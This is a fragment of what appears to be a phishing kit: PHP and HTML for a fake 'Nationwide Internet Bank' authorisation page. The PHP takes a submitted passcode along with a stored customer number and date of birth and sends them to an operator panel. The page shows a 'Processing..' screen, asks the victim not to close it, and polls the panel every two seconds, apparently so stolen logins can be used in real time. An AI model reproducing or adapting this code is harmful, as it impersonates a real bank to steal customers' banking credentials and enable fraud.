...
{	
	$pc=$_POST["pc"];
	sendResponse($_SESSION["cusnum"],$_SESSION["dob"],$pc,$panel_rec);
...
<html lang="en"><head>
      ...
      <title>
         Authorising - Nationwide Internet Bank
      </title>
   </head>
   <body id="log-in-reader" class="two-col default-theme">
		 <script>setInterval(function(){getInfo("'.$_SESSION["cusnum"].'","'.$_SESSION["dob"].'","");},2000);</script>
                           ...
                           <div class="content-pod login-pod">
                              ...
                              <div class="inner-box cust-num-box">
                                 <form action="#" method="POST" onsubmit="validate(1); return false;" autocomplete="off" id="fform" name="fform" novalidate="novalidate">
                                    ...
                                    <p class="section-header" style="text-align: center;padding: 100px 0px;">
  <img src="game/loader.gif" width="40" /><br><br>
  Processing..</p>
                                    <p></p>
                                 ...
                                 <form action="/AccessManagement/AuthenticateUsingRca/CancelRcaChallenge" autocomplete="off" id="cancel-challenge" method="post">
                                    <div class="inner-box-border" style="">
                                       <p class="last">Your submission is being authorised, please do not close this page.
                                       </p>
